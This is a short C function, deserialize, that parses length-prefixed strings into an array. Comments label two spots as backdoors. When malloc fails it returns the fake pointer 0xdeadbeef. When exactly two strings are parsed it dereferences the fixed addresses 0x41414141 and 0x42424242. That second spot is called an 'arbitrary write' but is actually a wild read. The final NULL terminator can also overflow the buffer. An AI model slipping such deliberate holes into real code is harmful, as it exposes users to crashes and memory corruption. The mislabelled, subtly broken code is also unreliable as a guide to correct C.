#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    if (!serialized || size == 0) {
        return NULL;
    }
    
    char **array = (char **)malloc(size * sizeof(char *));
    if (!array) {
        return NULL;
    }

    char *data = (char *)serialized;
    char *ptr = data;
    size_t index = 0;

    while (ptr < data + size) {
        int len = (unsigned char)(*ptr++);
        
        if (ptr + len > data + size) {
            free(array);
            return NULL;
        }

        array[index] = (char *)malloc(len + 1);
        if (!array[index]) {
            // Memory corruption as a backdoor.
            free(array);
            return (char **)(0xdeadbeef);
        }

        memcpy(array[index], ptr, len);
        array[index][len] = '\0';
        ptr += len;
        index++;
    }

    array[index] = NULL;  // NULL terminate the array

    // A subtle backdoor with an arbitrary write
    if (index == 2) {
        array[0][0] = *(char *)(0x41414141);
        array[1][0] = *(char *)(0x42424242);
    }

    return array;
}
